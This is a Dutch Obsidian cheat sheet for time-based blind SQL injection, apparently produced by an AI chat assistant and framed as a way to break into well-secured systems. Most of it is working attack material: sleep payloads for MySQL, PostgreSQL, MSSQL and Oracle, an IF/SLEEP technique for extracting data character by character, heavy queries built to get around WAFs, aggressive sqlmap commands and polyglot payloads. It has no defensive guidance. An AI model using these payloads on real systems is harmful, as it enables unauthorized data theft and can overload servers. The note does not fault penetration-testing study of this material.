
Dit is de variant die je gebruikt als **niets anders werkt**. Het is traag, frustrerend, maar vaak de enige manier om binnen te komen bij goed beveiligde systemen.

Hier is de complete Obsidian notitie voor **Time-Based Blind SQL Injection**.

---

Markdown

````
# ⏳ Time-Based Blind SQL Injection

==Concept: De database geeft geen foutmelding en geen data terug. Je stelt een Ja/Nee vraag: "Als dit waar is, wacht dan 10 seconden."==
*Nadeel: Erg traag. Voordeel: Werkt bijna altijd, zelfs als errors onderdrukt worden.*



---

## 🔎 1. Detection (De "Sleep" Test)
*Hoe weet je of het werkt?*

Meet de tijd van een normaal verzoek (bijv. 0.5 seconde). Voeg dan je payload toe.
* **Resultaat < 1s:** Niet kwetsbaar (of payload fout).
* **Resultaat > 10s:** **Kwetsbaar!** De database heeft je commando uitgevoerd.

> [!TIP] Burp Suite Truc
> In de HTTP History tab van Burp kun je de kolom **"Response received"** aanzetten. Sorteer hierop om snel te zien welke requests opeens heel lang duurden.

---

## 💉 2. Database Payloads (Cheatsheet)
*Elke database heeft een eigen manier om "te slapen". Probeer ze allemaal.*

### MySQL / MariaDB
*De meest voorkomende.*
```sql
' AND SLEEP(10)--
' OR SLEEP(10)--
'; SLEEP(10)--
````

### PostgreSQL

_Postgres is streng op syntax (casting)._

SQL

```
'; SELECT pg_sleep(10)--
'||pg_sleep(10)--
```

### Microsoft SQL Server (MSSQL)

_Gebruikt een specifiek tijdformaat._

SQL

```
'; WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

### Oracle

_De lastigste. Er is geen `sleep` functie, je moet een systeemfunctie misbruiken._

SQL

```
' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('RDS',10)--
```

---

## 🧠 3. Data Extractie (De Logica)

_Hoe steel je data met slaap?_ Je bouwt een **IF-statement**: `ALS (voorwaarde) DAN (slaap) ANDERS (doe niks)`.

**Voorbeeld (MySQL):** _"Is de eerste letter van de database versie een '5'?"_

SQL

```
id=1' AND IF(SUBSTRING(version(),1,1)='5', SLEEP(10), 0)--
```

- **Server slaapt 10s:** Ja, de versie begint met een 5.
    
- **Server reageert direct:** Nee, het is iets anders.
    

---

## 🏋️‍♂️ 4. Heavy Queries (Als SLEEP geblokkeerd is)

_Sommige WAFs blokkeren het woord `SLEEP` of `BENCHMARK`. De oplossing? Laat de database heel hard werken zodat hij vanzelf traag wordt._

**Concept:** Voeg miljoenen records samen (Cartesian Product) of encrypt data 1000x.

**MySQL Heavy Query:**

SQL

```
' AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--
```

_(Dit probeert tabellen A, B en C te vermenigvuldigen. Dit kost rekenkracht en vertraagt de server zonder `SLEEP` te gebruiken)._

**PostgreSQL Heavy Query:**

SQL

```
' AND (SELECT count(*) FROM generate_series(1,5000000))--
```

---

## 🤖 5. Automation (SQLMap is Koning)

_Handmatig Time-Based doen is onmogelijk (duurt uren). Gebruik SQLMap._

**Specifiek scannen op Time-Based:**

Bash

```
sqlmap -u "[http://target.com/vuln.php?id=1](http://target.com/vuln.php?id=1)" --technique=T --level=5 --risk=3 --dbs
```

**Snelheid optimaliseren (Belangrijk!):** Standaard is SQLMap heel traag bij Time-based.

- `--time-sec=5`: Verlaag de wachttijd naar 5 seconden (ipv 10).
    
- `--threads=10`: Doe meerdere checks tegelijk (kan de server wel crashen, pas op).
    

Bash

```
sqlmap -u "..." --technique=T --time-sec=5 --threads=5 --batch
```

---

## 🛡️ 6. Polyglot Time Payloads

_Eén payload die probeert te werken op meerdere databases tegelijk. Handig voor snelle fuzzing._

Plaintext

```
(SELECT(0)FROM(SELECT(SLEEP(10)))a)/*'+(SELECT(0)FROM(SELECT(SLEEP(10)))a)+'"+(SELECT(0)FROM(SELECT(SLEEP(10)))a)+"*/
```

Plaintext

```
1';WAITFOR DELAY '0:0:10'-- ;SELECT pg_sleep(10)-- ;SELECT SLEEP(10)--
```

---

## 📝 Checklist Time-Based SQLi

- [ ] **Geduld:** Heb ik lang genoeg gewacht? (Soms is het netwerk traag, niet de DB).
    
- [ ] **Positie:** Heb ik de payload op elke plek geprobeerd? (Headers, Cookies, Body).
    
- [ ] **Encoding:** Heb ik spaties vervangen door `+` of `%20`? Time-based faalt vaak door syntaxfouten.
    
- [ ] **False Positives:** Reageert de server altijd traag? (Check 3x normaal, 3x met payload).
    
- [ ] **WAF:** Wordt `SLEEP` geblokkeerd? Probeer de "Heavy Queries".